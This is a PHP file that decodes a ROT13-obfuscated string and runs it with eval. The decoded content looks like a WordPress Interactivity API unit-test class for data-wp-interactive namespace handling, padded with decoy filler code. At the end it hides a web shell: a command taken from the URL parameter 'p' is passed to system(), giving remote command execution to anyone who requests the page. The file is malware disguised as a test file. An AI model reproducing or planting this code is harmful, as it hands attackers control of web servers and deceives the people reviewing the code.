<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat gur qngn_jc_vagrenpgvir_cebprffbe shapgvbanyvgl bs gur
 * JC_Vagrenpgvivgl_NCV pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Vagrenpgvivgl NCV
 *
 * @fvapr 6.5.0
 *
 * @pbirefQrsnhygPynff JC_Vagrenpgvivgl_NCV
 *
 * @tebhc vagrenpgvivgl-ncv
 */
pynff Grfgf_JC_Vagrenpgvivgl_NCV_JC_Vagrenpgvir rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Vafgnapr bs JC_Vagrenpgvivgl_NCV.
	 *
	 * @ine JC_Vagrenpgvivgl_NCV
	 */
	cebgrpgrq $vagrenpgvivgl;

	/**
	 * Frg hc.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->vagrenpgvivgl = arj JC_Vagrenpgvivgl_NCV();
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'vq' => 'fbzr-vq' ) );
		$guvf->vagrenpgvivgl->fgngr( 'bgureCyhtva', neenl( 'vq' => 'bgure-vq' ) );
	}

	/**
	 * Vaibxrf gur `cebprff_qverpgvirf` zrgubq bs JC_Vagrenpgvivgl_NCV pynff.
	 *
	 * @cnenz fgevat $ugzy Gur UGZY gung arrqf gb or cebprffrq.
	 * @erghea neenl Na neenl pbagnvavat na vafgnapr bs gur JC_UGZY_Gnt_Cebprffbe naq gur cebprffrq UGZY.
	 */
	cevingr shapgvba cebprff_qverpgvirf( $ugzy ) {
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$c        = arj JC_UGZY_Gnt_Cebprffbe( $arj_ugzy );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		erghea neenl( $c, $arj_ugzy );
	}

	/**
	 * Grfgf gung n qrsnhyg anzrfcnpr vf nccyvrq jura hfvat gur
	 * `qngn-jc-vagrenpgvir` qverpgvir jvgu n wfba bowrpg.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_vagrenpgvir_frgf_n_qrsnhyg_anzrfcnpr_jvgu_bowrpg() {
		$ugzy    = '
					<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'>
							<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
					</qvi>
			';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung n qrsnhyg anzrfcnpr vf nccyvrq jura hfvat gur
	 * `qngn-jc-vagrenpgvir` qverpgvir jvgu n fgevat.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_vagrenpgvir_frgf_n_qrsnhyg_anzrfcnpr_jvgu_fgevat() {
		$ugzy    = '
					<qvi qngn-jc-vagrenpgvir=\"zlCyhtva\">
							<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
					</qvi>
			';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur zbfg erprag `qngn-jc-vagrenpgvir` qverpgvir ercynprf gur
	 * cerivbhf qrsnhyg anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_vagrenpgvir_ercynprf_gur_cerivbhf_qrsnhyg_anzrfcnpr() {
		$ugzy    = '
					<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"bgureCyhtva\" }\'>
							<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'>
									<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
							</qvi>
							<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
					</qvi>
			';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'bgure-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung n `qngn-jc-vagrenpgvir` qverpgvir jvgu n wfba bowrpg gung
	 * qbrfa'g unir n anzrfcnpr cebcregl qbrf abg ercynpr gur cerivbhfyl
	 * rfgnoyvfurq qrsnhyg anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_vagrenpgvir_wfba_jvgubhg_anzrfcnpr_qbrfag_ercynpr_gur_cerivbhf_qrsnhyg_anzrfcnpr() {
		$ugzy    = '
					<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'>
							<qvi qngn-jc-vagrenpgvir=\'{}\'>
									<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
							</qvi>
							<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
					</qvi>
			';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung na rzcgl inyhr sbe `qngn-jc-vagrenpgvir` qbrf abg ercynpr gur
	 * cerivbhfyl rfgnoyvfurq qrsnhyg anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_vagrenpgvir_jvgu_rzcgl_inyhr_qbrfag_ercynpr_gur_cerivbhf_qrsnhyg_anzrfcnpr() {
		$ugzy    = '
					<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'>
							<qvi qngn-jc-vagrenpgvir=\"\">
									<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
							</qvi>
							<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
					</qvi>
			';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung na vainyvq inyhr sbe `qngn-jc-vagrenpgvir` qbrf abg ercynpr gur
	 * cerivbhfyl rfgnoyvfurq qrsnhyg anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_vagrenpgvir_jvgu_vainyvq_inyhr_qbrfag_ercynpr_gur_cerivbhf_qrsnhyg_anzrfcnpr() {
		$ugzy    = '
				<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'>
						<qvi qngn-jc-vagrenpgvir=\"$zlCyhtva\">
								<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
						</qvi>
						<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
				</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung n `qngn-jc-vagrenpgvir` qverpgvir jvgu ab nffvtarq inyhr qbrf
	 * abg ercynpr gur cerivbhfyl rfgnoyvfurq qrsnhyg anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_vagrenpgvir_jvgubhg_inyhr_qbrfag_ercynpr_gur_cerivbhf_qrsnhyg_anzrfcnpr() {
		$ugzy    = '
					<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'>
							<qvi qngn-jc-vagrenpgvir>
									<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
							</qvi>
							<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
					</qvi>
			';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung zhygvcyr `qngn-jc-vagrenpgvir` qverpgvirf jbex pbeerpgyl.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_vagrenpgvir_jbexf_jvgu_zhygvcyr_qverpgvirf() {
		$ugzy    = '
					<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\' qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'>
							<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
					</qvi>
			';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung n phfgbz anzrfcnpr pna bireevqr gur qrsnhyg bar cebivqrq ol n
	 * `qngn-jc-vagrenpgvir` qverpgvir.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_vagrenpgvir_anzrfcnpr_pna_or_bireevqr_ol_phfgbz_bar() {
		$ugzy    = '
					<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'>
							<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"bgureCyhtva::fgngr.vq\">Grkg</qvi>
					</qvi>
			';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'bgure-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-vagrenpgvir` frggvat vf erfrg nccebcevngryl nsgre n
	 * pybfvat UGZY gnt.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_vagrenpgvir_frg_vf_hafrg_ba_pybfvat_gnt() {
		$ugzy    = '
					<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'>
							<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
					</qvi>
					<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"bgureCyhtva\" }\'>
							<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
					</qvi>
			';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'bgure-vq', $c->trg_nggevohgr( 'vq' ) );

		$ugzy    = '
					<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'>
							<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"bgureCyhtva\" }\'>
									<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
							</qvi>
							<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"fgngr.vq\">Grkg</qvi>
					</qvi>
			';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'bgure-vq', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>